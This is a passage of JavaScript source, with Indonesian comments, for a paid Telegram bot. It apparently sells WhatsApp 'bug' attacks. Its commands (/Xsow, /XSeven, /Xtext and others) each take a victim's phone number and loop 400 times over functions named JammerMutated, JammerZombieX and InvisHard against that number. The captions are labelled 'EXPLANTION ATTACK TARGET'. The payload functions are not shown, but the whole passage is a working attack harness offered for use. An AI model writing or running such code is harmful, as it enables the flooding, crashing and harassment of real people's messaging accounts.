    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xsow
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xsow: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xsow selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xsow
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xsow Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xsow ERROR:", error);
  }
});

bot.onText(/\/XSeven(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /XSeven 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : XSeven
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] XSeven: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug XSeven selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : XSeven
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("XSeven Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("XSeven ERROR:", error);
  }
});

bot.onText(/\/Xexplan(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xexplan 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xexplan
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xexplan: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xexplan selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xexplan
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xexplan Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xexplan ERROR:", error);
  }
});

bot.onText(/\/Xorionn(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xorionn 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xorionn
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xorionn: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xorionn selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xorionn
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xorionn Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xorionn ERROR:", error);
  }
});

bot.onText(/\/Xiyos(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xiyos 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xiyos
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xiyos: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xiyos selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xiyos
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xiyos Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xiyos ERROR:", error);
  }
});

bot.onText(/\/Superios(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Superios 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Superios
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Superios: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Superios selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Superios
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Superios Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Superios ERROR:", error);
  }
});

bot.onText(/\/Xnow(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xnow 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xnow
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xnow: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xnow selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xnow
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xnow Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xnow ERROR:", error);
  }
});

bot.onText(/\/Xtext(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xtext 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xtext
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xtext: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xtext selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xtext
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xtext Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xtext ERROR:", error);
